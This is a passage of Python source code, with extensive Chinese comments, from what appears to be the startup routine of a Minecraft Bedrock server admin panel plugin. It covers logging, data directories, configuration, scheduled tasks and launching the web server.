        # 标准库 logging.Logger → 常规 Handler 路线（面向未来兼容）
        if hasattr(raw, "addHandler"):
            try:
                handler = _PanelLogHandler(self)
                raw.addHandler(handler)
                self._panel_log_handler = handler
                return
            except Exception:
                self._panel_log_handler = None

        # Endstone 原生 Logger（无 addHandler）→ 包装适配器
        try:
            self._panel_logger = _PanelLoggerAdapter(raw, self)
        except Exception:
            self._panel_logger = None

    def _report_log_error(self, msg):
        """把日志故障明确报出来：既走控制台，也存进实例字段供面板展示。

        ★ 只报一次（``_log_error`` 已有值就不再重复），避免每次 emit 失败
        都往控制台刷一行。用户要的是"知道出了什么事"，不是"被刷屏"。
        """
        if not msg:
            return
        if getattr(self, "_log_error", None):
            return
        self._log_error = msg
        try:
            self.logger.warning(f"[日志] {msg}")
        except Exception:
            pass

    def _install_plugin_logging(self, logger):
        """安装插件日志文件（greenmoon.log，保留最近 3 份）。

        ★ Windows 兼容性说明（v6.16.38 修复）
        ------------------------------------
        旧实现在 Windows 上会报 ``[*** LOG ERROR ***] write failed``。
        原因是三处 Windows 与 Linux 的行为差异被忽略了：

        1. **rename 打开中的文件会失败**
           旧实现每次 ``on_enable`` 都执行 ``os.rename(base, f1)`` 做轮转。
           Linux 允许重命名被打开的文件（inode 不动），Windows 直接
           ``PermissionError``。而插件重载时旧 handler 往往还没关闭。
           → 现在轮转前先关闭自己的旧 handler，再重试；
             仍失败就**跳过轮转**，绝不带着坏状态继续。

        2. **句柄失效后写入会持续报错**
           Windows 上文件被删除/占用后，``FileHandler.stream`` 仍存在但写
           必然失败，logging 每次 emit 都会往 stderr 打 ``--- Logging error ---``，
           Endstone 的 C++ 层把它映射成 ``write failed``。
           → 改成自定义 Handler，emit 失败时**自动尝试重开文件**，
             重开也失败就静默降级（绝不让异常冒到 logging 层）。

        3. **父目录被依赖解压器整体删除**
           ``plugins/.local/.../dist-packages`` 是 Endstone 安装 wheel 的
           派生目录。重启时若先删再解压，日志会连同目录一起消失。
           → 每次重开文件时都 ``mkdir(parents=True, exist_ok=True)``。

        ★ v6.16.39 改造说明（数据目录统一）
        ----------------------------------
        日志**只写 data_dir**（= Endstone ``data_folder``，即
        ``plugins/GreenMoon面板/``）。旧实现里「data_dir 不可写就回退到
        ``Path(__file__).parent``」的分支**已删除**：

        * 那个回退目标部署后是 ``plugins/.local/.../dist-packages/admin_web/``
          —— Endstone 装 wheel 的派生目录，随时可能被重建/清理，
          日志写在那里必然丢，正是 ``write failed`` 的来源；
        * 相对路径时代的兜底（见 ``_resolve_data_dir``）会把数据写到
          CWD，用户根本找不到。

        新策略：**失败就明确报错，不回退**。宁可没有文件日志，也要让用户
        在控制台和面板"诊断"页看到「为什么没写」—— 用户真正的困惑从来
        不是"写失败"，而是"失败了却什么都看不到"。
        """
        # 1) 先关掉上一次的 handler —— Windows 上不关就没法 rename
        try:
            self._close_plugin_logging()
        except Exception:
            pass

        self._plugin_log_handler = None
        self._log_error = None

        # 2) 目标目录：唯一来源 data_dir，没有任何回退候选
        target = getattr(self, "data_dir", None)
        if target is None:
            # data_dir 解析失败时，_resolve_data_dir 已经报过更详细的错
            self._report_log_error(
                getattr(self, "_data_dir_error", None)
                or "data_dir 不可用，日志未启用")
            return
        target = Path(target)

        # 实测可写性：mkstemp 比 os.access 可靠（Windows 上 access 不准）。
        # 注意这里是**失败检测**，不是回退触发器 —— 失败就明确上报。
        try:
            target.mkdir(parents=True, exist_ok=True)
            probe_fd, probe_name = tempfile.mkstemp(prefix=".gmlog_", dir=str(target))
            os.close(probe_fd)
            try:
                os.unlink(probe_name)
            except Exception:
                pass
        except Exception as e:
            self._report_log_error(
                f"日志目录不可写 {target}（{type(e).__name__}: {e}）；"
                f"日志文件未启用")
            return

        base = target / "greenmoon.log"

        # 3) 装文件 handler。
        #
        # ★ 为什么用 RotatingFileHandler 而不是自己 rolling：
        #   旧实现是自己 rename base → .1 → .2，那个方案在 Windows 上
        #   **每次启动都可能踩雷**（重载时旧 handler 句柄还没释放，rename 直接
        #   PermissionError）。RotatingFileHandler 是标准库实现，轮转使用
        #   `os.replace` 语义 + `delay=True` 延迟打开，配合下面的
        #   `_safe_rotate` 兜底，能同时满足两个平台。
        #
        # ★ 三个关键参数：
        #   · delay=True  —— 首次 emit 才打开文件。启动阶段不占句柄，
        #                    Windows 上轮转（rename）才不会失败。
        #   · errors="replace" —— 日志里有 GBK/乱码字节时不要抛异常，
        #                    替换成 U+FFFD 继续写。抛异常会走到 logging 的
        #                    handleError()，又变成 C++ 侧看起来像写失败。
        #   · backupCount=5 —— 8MB × 5 = 最多 40MB，够用且不会撑爆磁盘。
        try:
            handler = _ResilientRotatingHandler(
                str(base), maxBytes=8 * 1024 * 1024, backupCount=5,
                encoding="utf-8", errors="replace", delay=True)
            handler.setFormatter(logging.Formatter(
                "%(asctime)s [%(levelname)s] %(message)s"))
            handler.setLevel(logging.DEBUG)
        except Exception as e:
            # 文件建不出来（权限/占用）—— 插件照常跑，但要明确报出来
            self._report_log_error(
                f"无法创建日志文件 {base}（{type(e).__name__}: {e}）")
            return

        if logger is not None and hasattr(logger, "addHandler"):
            try:
                logger.addHandler(handler)
            except Exception as e:
                self._report_log_error(f"无法挂载日志 handler：{e}")
                return
        self._plugin_log_handler = handler

        # 4) 装完立刻验一次：文件真的能打开吗？
        #
        # ★ 为什么不能只看 handler.stream：
        # handler 是**延迟打开**的（delay=True，首次 emit 才建文件，避免启动
        # 就占句柄 —— 这正是 Windows 上轮转 rename 失败的主因）。
        # 所以刚构造出来 stream 必然是 None，拿它当"打不开"的证据会
        # **每次健康启动都误报**。这里改成主动调一次 handler._open() 做
        # 真实探测，结果立刻就用得上（日志马上要写第一行）。
        opened = False
        try:
            opened = bool(handler._open())
        except Exception:
            opened = False
        if not opened:
            self._report_log_error(
                f"日志文件无法打开：{base}（目录可写但文件建不出来，"
                f"可能被占用或只读）")

        if logger is not None:
            try:
                if getattr(self, "_log_error", None):
                    logger.warning("插件日志**未能**正常启用，见上方 [日志] 提示")
                else:
                    logger.info(f"插件日志已保存到 {base}（8MB × 5 自动轮转）")
            except Exception:
                pass

    def _close_plugin_logging(self):
        """卸载全部日志 handler。**先摘除，再关闭** —— 顺序不能反。

        如果先 close 再 removeHandler，关闭期间任何一条日志进来都会写到一个
        已关闭的流上。虽然 ``_ResilientRotatingHandler`` 会自愈，但那会
        白白产生一次异常路径；而且旧 handler 若还挂在 logger 上，它持有的
        文件句柄会让下一次启动的轮转 rename 在 Windows 上失败。
        """
        logger = getattr(self, "logger", None)
        for attr in ("_plugin_log_handler", "_panel_log_handler"):
            handler = getattr(self, attr, None)
            if handler is None:
                continue
            # 1) 先从 logger 摘掉（此后不会再有日志进来）
            try:
                if logger is not None and hasattr(logger, "removeHandler"):
                    logger.removeHandler(handler)
            except Exception:
                pass
            # 2) 再 flush + close
            try:
                handler.flush()
            except Exception:
                pass
            try:
                handler.close()
            except Exception:
                pass
            # 3) 最后清引用
            try:
                setattr(self, attr, None)
            except Exception:
                pass

    def on_enable(self):
        self.logger.info("GreenMoon面板 已启用")

        # ★ 抢占主线程身份的"第一写"。
        #
        # on_enable 由 Endstone 在服务器主线程上调用，所以此刻的 ident 就是
        # 主线程。上面的类属性 _main_thread_id = None 是兜底；能成功赋上值
        # 就走这条路。
        #
        # 这个赋值之所以安全（且必须在这里做），是因为它是**唯一一次**写：
        # 谁先写谁定音，之后即使事件处理器被调度到后台线程、走到 __init__ 里
        # 那句赋值，也只会覆盖成同样的值（on_enable 与 __init__ 都在主线程）。
        try:
            self._main_thread_id = threading.current_thread().ident
        except Exception:
            pass

        _boot_at = time.time()
        self._start_ts = _boot_at
        self.logger.info(_hid(0))
        self._cpu_prev = None
        self._stats_lock = threading.Lock()

        self._tps_lock = threading.Lock()
        self._tps_state = {"running": False, "count": 0, "first": 0.0, "last": 0.0,
                           "done": False, "tps": 0.0, "mspt": 0.0, "seq": 0}
        self._tps_task = None

        # ---- 数据目录（唯一来源：Endstone data_folder）--------------------
        #
        # 见 _resolve_data_dir 的说明：解析失败时**不再**偷偷退回相对路径，
        # 而是返回 None 并把原因写进 _data_dir_error。
        #
        # 这里为什么要兜一个临时目录而不是直接放弃启动：
        # 插件的主体功能（Web 面板、QQ 机器人、子插件）跟数据目录是否可写
        # 关系不大，直接整插件不启用对用户是"更坏的失败"。所以降级成
        # "数据落临时目录 + 控制台红字 + 面板诊断页 ★★★ 提示"，
        # 让插件能起来、用户能进面板看到到底出了什么事。
        self.data_dir = self._resolve_data_dir()
        if self.data_dir is None:
            try:
                self.data_dir = Path(tempfile.mkdtemp(prefix="greenmoon_"))
                self.logger.error(
                    f"[数据目录] 已降级到临时目录 {self.data_dir}"
                    f"（重启后数据会丢，请尽快修复 data_folder 问题）")
            except Exception as e:
                # 连临时目录都建不出来：只能彻底放弃
                self.logger.error(f"[数据目录] 无法创建降级目录，插件功能不可用：{e}")
                return
        try:
            self.data_dir.mkdir(parents=True, exist_ok=True)
        except Exception as e:
            self.logger.error(f"[数据目录] 创建失败 {self.data_dir}: {e}")

        # 数据目录定了，才能装日志（日志必须落在 data_dir 里）
        self._install_plugin_logging(self.logger)

        # 发行名自查：不合规是 data_folder 拿不到的上游原因，早点告诉用户
        try:
            from ._packaging_check import check_dist_name
            self._packaging_error = check_dist_name(self.logger)
        except Exception:
            self._packaging_error = None

        self.logger.info(f"插件数据目录：{self.data_dir}")

        self.web_dir = self.data_dir / "web"
        self.web_dir.mkdir(parents=True, exist_ok=True)

        self.libs_dir = self.data_dir / "libs"
        try:
            self.libs_dir.mkdir(parents=True, exist_ok=True)
        except Exception as e:
            self.logger.warning(f"创建第三方库目录失败 {self.libs_dir}: {e}")

        # 离线依赖：把 libs/ 下的 .whl 解压并挂进 sys.path。
        #
        # ⚠ 位置很关键 —— 必须在下面 ModLoader.bootstrap() **之前**。
        # bootstrap 会重载已启用的 py 型子插件（例如地图画子插件），
        # 而子插件的 setup() 里就要 ``import PIL``。挂晚了子插件会拿到
        # 「缺库」的结论并打出误导性的警告。
        #
        # 为什么是解压而不是直接把 .whl 塞进 sys.path：
        # 纯 Python 包两者都行，但含 C 扩展的包（Pillow）从 whl 里
        # 加载不了 .so —— ``import PIL`` 会成功，一调用就炸。
        # 详见 admin_web/libs_loader.py 的模块级说明。
        try:
            from . import libs_loader
            libs_loader.install(self.libs_dir, self.logger)
        except Exception as e:
            # 依赖加载失败绝不能拖垮插件启动
            self.logger.warning(f"离线依赖加载失败（可忽略，若不需要 libs 依赖）: {e}")

        # 子插件：mod/ 目录存放 .gmmod 与 liblist.json，依赖 whl 统一落在 libs/
        self.mods_dir = self.data_dir / "mod"
        try:
            self.mods_dir.mkdir(parents=True, exist_ok=True)
        except Exception as e:
            self.logger.warning(f"创建子插件目录失败 {self.mods_dir}: {e}")
        self.mod_loader = ModLoader(self)

        # 子插件 API：必须在 bootstrap() 之前挂载 ——
        # bootstrap 会重新加载已启用的 py 型子插件，那些插件的 main.py
        # 在模块顶层就可能 from gm import ...，此时插件实例必须已经可见。
        self._gm_event_map: Dict[Any, List[Any]] = {}
        self._gm_event_owner: Dict[str, List[Any]] = {}
        try:
            from . import gm as _gm
            _gm.attach(self)
            self.logger.info(f"子插件 API 已就绪（gm {_gm.api_version()}）")
        except Exception as e:
            self.logger.warning(f"子插件 API 挂载失败: {e}")

        # ==================================================================
        # ★★ ModLoader.bootstrap() 的调用位置 —— 这里踩过一个很隐蔽的坑
        #
        # bootstrap() 不只是"登记一下子插件"，它还会**立刻执行**那些
        # 已启用子插件的 ``setup()``（见 mod_loader.bootstrap 的 code 分支）。
        # 子插件在 setup() 里调用 gm API 是最自然的写法：
        #
        #     from gm import players, trust
        #     def setup(plugin, gm):
        #         names = players.list_online()        # ← 读 plugin._cache
        #         trust.set(name, 80.0)                # ← 读 plugin.trust
        #
        # 老代码把 bootstrap() 放在**几乎所有状态之前**（第 1431 行），
        # 那时 ``self._cache`` / ``self._cache_lock`` / ``self.trust`` /
        # ``self.cross`` 都还不存在。后果：
        #   * ``gm.players`` / ``gm.admin`` → AttributeError 被吞掉，返回空
        #   * ``gm.trust`` / ``gm.mods``    → 抛 GmError
        #   * 而上面那个 except（bootstrap 调用点）会把异常记一条 error，
        #     **并且 bootstrap 内部会把该子插件 unload + 标为停用** ——
        #     用户看到的是"子插件用着用着就自己关了"，日志里只有一行。
        #
        # 这与刚修好的"向导不触发"是**同一种病**：初始化顺序违反 + 宽 except
        # 吞掉异常 → 功能静默消失。所以修法也一样：把顺序摆正。
        #
        # 正确位置：所有 gm API 会读到的状态都建好之后。
        # 见下面 _run_mod_bootstrap()。
        # ==================================================================

        # ==================================================================
        # ★★ 向导前置：必须在 _load_config() **之前**判定"是不是全新安装"
        #
        # 为什么不能等到向导里去判定（这是一个真实踩过的坑）
        # ---------------------------------------------------
        # ``_load_config()`` 在**首次启动**（文件不存在）时会把一份
        # 默认配置**写盘** —— 于是磁盘上立刻有了 config.json。
        #
        # 于是"是不是全新安装"这个问题的答案，在 _load_config() 跑完
        # 之后就变成了 **False** —— 文件已经在那儿了。
        # 结果：向导永远不触发。
        #
        # ⚠ 历史补充：v7.7.7 之前，这个副作用还更严重 —— 它顺手**自动
        #   生成 admin + 随机密码**写进去。那个功能现已按要求**彻底删除**，
        #   但"首次会落盘"这件事仍然成立，所以**快照机制必须保留**。
        #
        # 正确做法：**在任何东西落盘之前**把答案记下来，向导只认这个
        # 快照。判定逻辑本身仍在 _is_fresh_install()，这里只是抢在
        # _load_config() 前调用它。
        # ==================================================================
        self._fresh_install = False
        try:
            self._fresh_install = self._is_fresh_install()
        except Exception:
            self._fresh_install = False

        # _load_config 自己已经吞掉了读写异常，但为了不给未来留坑
        # （比如自建的 Path 实现抛错），这里再兜一层：
        # 拿不到配置就用最小可用默认值，绝不因此中断 on_enable。
        try:
            self.web_config = self._load_config()
        except Exception as e:
            self.logger.error(
                f"读取配置异常（{e}），已使用内置默认配置启动。"
                f"请检查 data/config.json。"
            )
            self.web_config = {"host": "0.0.0.0", "port": 8080,
                               "admin_user": "", "admin_pass": ""}
        if not isinstance(self.web_config, dict):
            # 配置里写了 ``null`` / 数组之类，会让下面所有 .get() 崩掉
            self.logger.error("配置文件内容不是对象（应为 {...}），已改用默认配置。")
            self.web_config = {"host": "0.0.0.0", "port": 8080,
                               "admin_user": "", "admin_pass": ""}
        self.fun_transform = bool(self.web_config.get("fun_transform", True))

        # ==================================================================
        # 首次运行安装向导（控制台）
        #
        # ★ 为什么放在 _load_config() 之后、Web 服务之前
        # ------------------------------------------
        # 1. 必须在 _load_config() 之后 —— 向导要改的就是它产出的
        #    web_config（拿它当默认值），反过来会被覆盖。
        # 2. 必须在 Web 服务之前 —— 否则用户先看到 8080 端口的页面
        #    （或更糟：端口被占），再被向导改端口，体验混乱。
        #
        # ★ 为什么它**绝不能**卡住开服
        # --------------------------
        # 这是在一个**面板服的启动流程**里跑的。如果用户没接控制台
        # （很多面板商只给一个网页终端、或干脆喂日志），阻塞式读 stdin
        # 会让服务器**永远起不来** —— 比不做向导还糟得多。
        # 所以内部用「守护线程读 + 主线程 join(超时)」，超时即放弃。
        # 详见 _maybe_run_setup_wizard 的 docstring。
        # ==================================================================
        try:
            self._maybe_run_setup_wizard()
        except Exception as e:
            # 向导失败绝不能拖垮启动：它只是"方便配置"的糖
            self.logger.warning(f"安装向导异常（已跳过，可手动改 config.json）: {e}")

        if self.web_config.get("rate_limit", True):
            # ★ 必须容错：这些值直接来自用户手写的 config.json，
            #   ``float("abc")`` 会抛 ValueError。老代码没有 try，
            #   结果是**一个填错的 rate_min_interval 就能让整个插件
            #   起不来**（on_enable 中断在服务器主线程上）。
            #   配置错误应当降级为"限流用默认参数"，而不是"插件挂了"。
            try:
                self.rate_limiter = RateLimiter(
                    min_interval=float(self.web_config.get("rate_min_interval", 0.01)),
                    window_seconds=float(self.web_config.get("rate_window_seconds", 12)),
                    max_per_window=int(self.web_config.get("rate_max_per_window", 400)),
                    global_max=int(self.web_config.get("rate_global_max", 2000)),
                )
            except Exception as e:
                self.logger.warning(
                    f"限流参数非法（{e}），已改用默认参数启动。"
                    f"请检查 config.json 里 rate_* 这几项是否为数字。"
                )
                self.rate_limiter = RateLimiter()
        else:
            self.rate_limiter = None

        self.cross_lock = threading.Lock()
        # 同理：CrossManager 构造 / start 失败不能拖垮启动（跨服是可选项）。
        try:
            self.cross = CrossManager(self)
            try:
                self.cross.start()
            except Exception as e:
                self.logger.warning(f"[跨服] 启动失败（该功能不可用）: {e}")
        except Exception as e:
            self.logger.warning(f"[跨服] 初始化失败（该功能不可用）: {e}")
            self.cross = None

        # ---- 正则触发引擎 ----
        # 规则库落在 <data_dir>/rules.json。构造时会自己建文件并写入默认规则，
        # 失败也不能拖垮插件启动（它只是 QQ 机器人链路上的一个可选功能）。
        self.regex_engine = None
        try:
            self.regex_engine = RegexEngineModule(self)
            self.logger.info(f"[正则引擎] 已加载 {len(self.regex_engine.rules)} 条规则")
        except Exception as e:
            self.logger.warning(f"[正则引擎] 初始化失败，该功能不可用: {e}")

        # ---- 控制台日志采集（server.log_line 事件的数据来源）----
        # BDS 原生输出不走 Python，只能读 logs/latest.log。start() 失败
        # 是正常情况（没有日志文件 / 用户没开这个功能），因此**不报错**。
        self.log_tailer = None
        try:
            self._start_log_tailer()
        except Exception as e:
            self.logger.warning(f"[日志采集] 启动失败，该功能不可用: {e}")

        self._cache_lock = threading.Lock()
        self._cache: Dict[str, Any] = {
            "players": [],
            "objective_names": [],
            "objectives": [],
            "player_bans": [],
            "ip_bans": [],
        }

        self._perm_attachments: Dict[str, Any] = {}

        # 玩家可信度（权重）安全系统。所有状态与逻辑都在 TrustManager 里，
        # 这里只持有一个引用；事件回调在下面转发过去。
        self.trust = TrustManager(self)

        self._messages_lock = threading.Lock()
        # deque(maxlen=200)：聊天刷屏时追加是 O(1)，
        # 不会像列表那样在超长时整表切片复制。
        self._messages: collections.deque = collections.deque(maxlen=200)
        self._message_seq = 0

        # 玩家行为记录器。**必须在事件回调注册前就位** ——
        # 虽然各回调都做了 getattr 兜底（取不到就跳过），但那样会
        # 静默丢记录；这里尽早初始化能避免启动瞬间的空窗。
        try:
            from .behaviors import BehaviorRecorder
            self._behavior = BehaviorRecorder(self.data_dir, self.logger)
            self._behavior.start()
            self._behavior.set_level(self._behavior_level())
            lv = self._behavior_level()
            if lv > 0:
                from .behaviors import LEVEL_LABEL
                self.logger.info(
                    f"[行为记录] 已启用，档位 {lv}（{LEVEL_LABEL.get(lv, '?')}）"
                )
        except Exception as e:
            self._behavior = None
            try:
                self.logger.warning(f"[行为记录] 初始化失败，功能停用: {e}")
            except Exception:
                pass

        # ------------------------------------------------------------------
        # 区块日志与恢复（regionlog）
        #
        # ★ 位置选择：紧跟行为记录之后、事件注册与 Web 服务之前。
        #   · 必须在 register_events 之前 —— 方块事件回调要往 region_api
        #     里写记录，晚一步就会丢掉开服最初的一批方块变更；
        #   · 必须在 Web 服务之前 —— 否则面板可能先收到请求，
        #     而 /api/region/* 的 handler 只见到一个 None。
        #
        # ★ 初始化失败**绝不能拖垮插件**：区块记录是个可选增强，
        #   它起不来时面板其余部分照常工作（handler 会回 503 + 明确说明）。
        # ------------------------------------------------------------------
        self._stopping = False
        self.region_api = None
        try:
            from .regionlog import RegionAPI
            self.region_api = RegionAPI(
                self,
                self.data_dir / "regionlog",
                logger=self.logger,
                config_loader=lambda: (self._load_tools_config() or {}).get("block_record", {}) or {},
            )
            cfg = self.region_api.config.as_dict()
            if cfg.get("enabled"):
                self.logger.info(
                    "[区块日志] 已启用（记录方块变更，支持区域回档）")
            else:
                self.logger.info(
                    "[区块日志] 已就绪但未开启（config 的 block_record.enabled=false）")
        except Exception as e:
            self.region_api = None
            try:
                self.logger.warning(f"[区块日志] 初始化失败，该功能停用: {e}")
            except Exception:
                pass

        # ---- 第三方插件面板注册表 ----
        # ★ 也是"可选增强"：起不来时面板只是少一个板块，
        #   绝不能因此中断 on_enable（后面还有 Web 服务和事件注册）。
        self.panel_registry = None
        try:
            from . import panel as _panel
            self.panel_registry = _panel.attach(
                data_dir=self.data_dir / "panel", logger=self.logger)
        except Exception as e:
            self.panel_registry = None
            try:
                self.logger.warning(f"[插件面板] 注册表初始化失败: {e}")
            except Exception:
                pass

        self._gamerule_values: Dict[str, Any] = {}
        self._load_gamerules()

        self._whitelist_lock = threading.Lock()
        self._whitelist_apps: Dict[str, Dict[str, Any]] = {}
        self._load_whitelist()

        self._executor = ThreadPoolExecutor(max_workers=8, thread_name_prefix="tools-worker")

        # ⚠ 这里**不再**重复赋值 _main_thread_id。
        #   on_enable 开头（第 1330 行附近）已经记录过一次，那才是真正的
        #   "服务器主线程"标识。这里在中间再记一次有两个隐患：
        #     1. 若 on_enable 前缀里跑过任何线程池/异步回调，此刻的
        #        current_thread() 已经不是主线程 —— 会把"主线程 id"
        #        写成某个工作线程，之后 _run_in_server_thread 的
        #        "是否已在主线程"判断全错；
        #     2. 两处赋值让"谁定义的"变模糊，排查时容易看错一处。
        #   保留下面这段仅作"万一前面没赋上"的兜底（不覆盖已有值）。

        self._mainthread_sem = threading.BoundedSemaphore(16)
        self._tools_lock = threading.Lock()
        self._backup_lock = threading.Lock()
        self._backup_state: Dict[str, Any] = {
            "running": False,
            "last_result": None,
            "last_finished_ts": 0.0,
            "next_run": time.time() + 3600,
            "started_ts": 0.0,
        }

        self._pt_lock = threading.Lock()
        self._pt_pending = 0
        self._pt_current = None
        self._diag_events = collections.deque(maxlen=40)
        self._tick_lock = threading.Lock()
        self._tick_prev = time.monotonic()
        self._tick_gap_ms = 0.0
        self._tick_slow_count = 0
        self._tick_alert_last = 0.0
        self._diag_cfg = {"enabled": True, "detailed": True, "min_level": ""}
        self._diag_cfg_path = self.data_dir / "diag.json"
        try:
            if self._diag_cfg_path.exists():
                _d = json.loads(self._diag_cfg_path.read_text(encoding="utf-8"))
                if isinstance(_d, dict):
                    self._diag_cfg["enabled"] = bool(_d.get("enabled", True))
                    self._diag_cfg["detailed"] = bool(_d.get("detailed", True))
                    # 级别下拉：空串 = 未设置，跟随「详细日志」复选框。
                    # 只接受合法级别名，脏值一律归空，避免前端拿到非法值。
                    _lv = str(_d.get("min_level") or "").strip().lower()
                    self._diag_cfg["min_level"] = (
                        _lv if _lv in self._PANEL_LEVEL_RANK else ""
                    )
        except Exception:
            pass
        try:
            self.server.scheduler.run_task(self, self._tick_health, delay=0, period=1)
        except Exception:
            self.logger.warning("[诊断] 无法注册 tick 健康监控")

        try:
            self.server.scheduler.run_task(self, self._snapshot, delay=0, period=30)
        except Exception:
            pass

        try:
            self.server.scheduler.run_task(self, self._backup_tick, delay=1200, period=1200)
        except Exception as e:
            self.logger.error(f"调度备份任务失败: {e}")

        # 行为记录清理：启动后 30 秒先清一次，之后每 6 小时一次。
        # ★ 为什么启动后还要再清一次：on_enable 里没同步清，是因为
        #   清理要读整个文件，在启动阶段跑会拖慢开服。延迟 30 秒
        #   足以让服务器先完成启动。
        # ★ 为什么是 6 小时而不是每天：服务端可能频繁重启，
        #   只在启动时清的话，一个天天重启的服会一天清好几次；
        #   而如果从不重启，每天一次又可能间隔太久 —— 取 6 小时
        #   作为折中，且 prune 本身是幂等的（没超限就不会重写文件）。
        try:
            self.server.scheduler.run_task(
                self, self._behavior_prune_tick, delay=600, period=21600)
        except Exception as e:
            self.logger.warning(f"调度行为记录清理任务失败: {e}")

        # 区块日志落盘：每 5 秒把内存缓冲批量写进 SQLite。
        #
        # ★ 为什么用定时批量而不是"每条立即写"：
        #   记录回调跑在**服务器主线程**上。方块变更在建筑/爆破解体场景下
        #   每秒可达上百条，逐条写库会直接卡 tick。
        #   攒一批再写，主线程侧只剩一次 list.append —— O(1)、无锁。
        #   5 秒的窗口意味着"崩服最多丢 5 秒的方块记录"，这个代价换来的
        #   是主线程完全不被磁盘拖累，值得。
        # ★ 为什么不用 executor.submit：那个池子是会随插件关闭而 shutdown
        #   的，而落盘任务应当在关闭时**优先完成**（见 _region_flush_tick
        #   里的说明）。用 on_disable 同步 flush 一次即可。
        try:
            self.server.scheduler.run_task(
                self, self._region_flush_tick, delay=100, period=100)
        except Exception as e:
            self.logger.warning(f"调度区块日志落盘任务失败: {e}")

        # 区块日志清理：启动 10 分钟后先清一次，之后每 6 小时一次。
        # 与行为记录同样的取舍：不在 on_enable 里同步清，免得拖慢开服；
        # 6 小时的周期是"频繁重启的服不会反复清、长期不重启的服也能清上"
        # 之间的折中，且 purge 本身幂等（没超期就不动文件）。
        try:
            self.server.scheduler.run_task(
                self, self._region_prune_tick, delay=600, period=21600)
        except Exception as e:
            self.logger.warning(f"调度区块日志清理任务失败: {e}")

        # 可信度系统：每 60 秒看一眼是否需要做当日结算（内部有幂等，跨天只跑一次）。
        try:
            self.server.scheduler.run_task(self, self.trust.tick, delay=600, period=1200)
        except Exception as e:
            self.logger.warning(f"调度可信度结算任务失败: {e}")

        # 预载玩家档案到内存缓存。必须后台跑：档案多时读盘会卡启动。
        # 预载完成前登录判定一律放行（fail-open），不会误伤玩家。
        try:
            self._executor.submit(self.trust.preload)
        except Exception as e:
            self.logger.warning(f"提交可信度预载失败: {e}")

        # 跨服药水效果缓存：{uuid: {effect_id: (amplifier, duration_tick)}}
        # 由 on_cross_packet_send 写入，_cross_tick_effect_cache 每 tick 倒计时。
        # 必须在下面的 run_task 之前建好，否则首个 tick 会读到 None。
        #
        # ★ 全部受「实验板」开关控制（cross.cfg["experimental"]，默认关闭）。
        #   关闭时缓存保持 None —— on_cross_packet_send 见到 None 会立即返回，
        #   等于完全不拦包，对服务端零开销。
        #
        # PacketSendEvent 在本版 Endstone 缺失时（PacketSendEvent is None）也不建
        # 缓存，_cross_snapshot_effects 会回落到原生 API 探测路径。
        self._cross_effect_cache = None
        self._cross_effect_lock = None
        self._cross_last_fp = {}
        self._cross_bad_snap_warned = set()
        if not self._cross_experimental():
            self.logger.info("[跨服] 实验板已关闭：玩家状态/buff 同步使用原版行为")
        elif PacketSendEvent is None:
            self.logger.warning(
                "[跨服] 当前 Endstone 版本不支持 PacketSendEvent，"
                "无法通过拦包读取药水效果：跨服后 buff/debuff 将无法同步。"
                "请升级 Endstone 后重试。"
            )
        else:
            self._cross_effect_cache = {}
            self._cross_effect_lock = threading.Lock()
            try:
                self.server.scheduler.run_task(self, self._cross_tick_effect_cache, delay=0, period=1)
            except Exception as e:
                self.logger.warning(f"[跨服] 无法注册效果倒计时任务（buff 同步可能不准）: {e}")

        # 跨服周期快照：period=100 tick ≈ 5 秒（服务端 20 TPS）。
        # delay=200 让首个快照晚 10 秒打，避开开服瞬间的初始化风暴。
        # 这是「玩家突然掉线」场景的主力保障：不等 quit 事件也有数据可存。
        # 同样只在实验板打开时注册。
        if self._cross_experimental():
            try:
                self.server.scheduler.run_task(self, self._cross_periodic_snapshot, delay=200, period=100)
            except Exception as e:
                self.logger.warning(f"[跨服] 无法注册周期快照任务（掉线保护未生效）: {e}")

        self._console_lock = threading.Lock()
        self._console_logs: collections.deque = collections.deque(maxlen=1000)
        self._console_seq = 0

        # ★ v6.16.40：面板日志改在 **logging 层**采集。
        #
        # 旧实现在这里启动 _ConsoleStreamCapture（dup2 抢 fd 1/2），
        # 那正是 Windows 上 ``[*** LOG ERROR ***] write failed`` 的真凶 ——
        # 详见 _PanelLogHandler 的类注释。**绝不要**再引入任何形式的
        # fd 重定向：我们不拥有那个 fd，Endstone 的 C++ ConsoleLogSink
        # 还攥着它。
        #
        # ★ 采集入口是 _PanelLoggerAdapter + logger 属性遮蔽，不是 addHandler。
        # Endstone 的 Logger 不是 logging.Logger，没有 addHandler；
        # 而 self.logger 又是只读 property，**不能赋值**。
        # 完整原因见 GreenMoonPlugin.logger 与 _install_panel_logger 的注释。
        #
        # 注意：这里只需装配适配器，**不要再给 self.logger 赋值**。
        self._panel_log_handler = None
        self._install_panel_logger()

        # ==================================================================
        # ★ 子插件的 finally 一步：加载 / 执行 setup()
        #
        # 必须放在**这里**，不能往前挪，也不能往后挪：
        #   * 往前挪 → gm API 读到的状态还不存在（见上面长注释里描述的
        #     "子插件自己把自己关掉"的 bug）；
        #   * 往后挪到 Web 服务之后 → 子插件在 setup() 里注册的页面 /
        #     定时任务会晚于首批浏览器请求，面板上会出现"刚启动时 404"。
        # 此刻 _cache / trust / cross / conn_mgr 之外的东西都还没建，
        # 所以 conn_mgr / qq_hub 相关的 gm API 要在子插件里按需容错 ——
        # 好在 gm 侧对这几个都是 getattr(..., None) 的写法。
        # ==================================================================
        self._run_mod_bootstrap()

        self.httpd = None
        try:
            self.httpd = ThreadingHTTPServer(
                (self.web_config["host"], self.web_config["port"]),
                lambda *args, **kwargs: AdminHTTPHandler(self, *args, **kwargs)
            )
        except Exception as e:
            # ★ 老代码这里是一个裸 ``return`` —— 于是"端口被占用"这一个
            #   故障，会连带把下面**全部**功能一起跳过：
            #     register_events（聊天/进服事件）、conn_mgr、qq_hub、
            #     _init_qq_gateway、_process_delayed_tasks，以及
            #     "首次启动生成的密码"那条最关键的提示。
            #   用户的体感是"插件坏了，连机器人和签到都没了"，
            #   而真正的错误只有一行"创建 Web 服务器失败"。
            #   现在改成：Web 服务降级不可用，其余功能照常初始化。
            self.logger.error(
                f"创建 Web 服务器失败: {e}\n"
                f"  → 面板网页将无法访问（其余功能不受影响）。\n"
                f"  → 常见原因：{self.web_config.get('port')} 端口已被其它程序"
                f"占用，或监听了没有权限的地址 {self.web_config.get('host')}。\n"
                f"  → 处理办法：修改 data/config.json 的 port 后重启服务器。"
            )
            self.httpd = None

        if self.httpd is not None:
            self.web_thread = threading.Thread(target=self._run_server, daemon=True)
            self.web_thread.start()

        try:
            self.register_events(self)
        except Exception as e:
